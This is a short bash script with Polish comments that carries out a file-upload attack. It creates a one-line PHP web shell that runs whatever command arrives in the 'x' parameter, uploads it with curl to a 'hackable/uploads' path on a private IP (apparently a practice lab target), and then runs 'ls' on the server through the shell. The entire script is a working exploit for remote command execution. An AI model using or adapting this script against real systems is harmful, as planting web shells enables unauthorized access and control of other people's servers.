#!/bin/bash

# Krok 1: Utwórz plik PHP
echo "<?php system(\$_REQUEST['x']); ?>" > file_upload.php
echo "file_upload.php został utworzony."

# Krok 2: Wgraj plik za pomocą curl
curl -F "data=@file_upload.php" http://10.10.95.161/hackable/uploads
echo "Plik został pomyślnie wgrany."

# Krok 3: Wykonaj polecenie ls na serwerze docelowym i wyświetl odpowiedź
curl http://10.10.95.161/hackable/uploads/file_upload.php?x=ls
